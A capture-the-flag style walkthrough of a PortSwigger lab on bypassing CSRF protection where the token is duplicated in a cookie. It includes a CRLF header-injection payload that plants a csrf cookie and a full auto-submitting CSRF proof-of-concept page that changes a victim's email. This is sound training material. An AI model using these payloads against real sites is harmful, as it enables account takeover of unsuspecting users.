## Welcome, my friend. Today we will start the [6. CSRF lab](https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie) in ```portswigger```

### Let's play this lab:

![image](https://github.com/user-attachments/assets/4c65afa1-bd8d-478a-b91c-2969c5dfbf1b)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/c5a5656d-9ed5-4185-8d44-bf1c82d08478)

#### We can log in to our account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/f4bbd8f2-d952-4cea-a5c3-cbe095af6c12)

#### Let's update email to ```0xT0R@gmail.com```:

![image](https://github.com/user-attachments/assets/f0143b2d-6431-4319-97a6-a039845cabd1)

#### We need do this task but through our victim by CSRF, we should intercept this request of update email by burp suite.

![image](https://github.com/user-attachments/assets/5b549f6c-7c42-4053-a544-116ed80e6a20)


### Let's change values of csrf and csrfkey:

![image](https://github.com/user-attachments/assets/c75f6117-fcad-4167-acca-8066a8ac1d03)



### Now Go to wiener account and go to home page and search about ```hi``` in search paramater:

![image](https://github.com/user-attachments/assets/383bc09a-ee98-40ae-aa35-657fc7084fbe)

#### and intercept this request in burp suite:

![image](https://github.com/user-attachments/assets/06cd30e7-0ae2-4884-88ad-5d239d6844ef)

### Great, we discove ```LastSearchTerm``` paramater in set-cookie.

### Let's changed search value to:

```
/?search=hi%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None
```

![image](https://github.com/user-attachments/assets/6bbafd99-c1dd-4c4e-9ed4-582fbf189930)

### Go to exploit server and paste this code:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9b005d03f809c78201c4d300bb00cb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="ali&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="hi" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a9b005d03f809c78201c4d300bb00cb.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=hi%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/24c5efb2-dc38-4e5b-8bbf-d54e89c117a2)



-------

### Done! Congratulations, friends‚ù§Ô∏è‚Äçüî•


<p align="center">
<img src="https://github.com/user-attachments/assets/1c9fe230-b538-4250-8430-f93651e64fd6" >
</p>
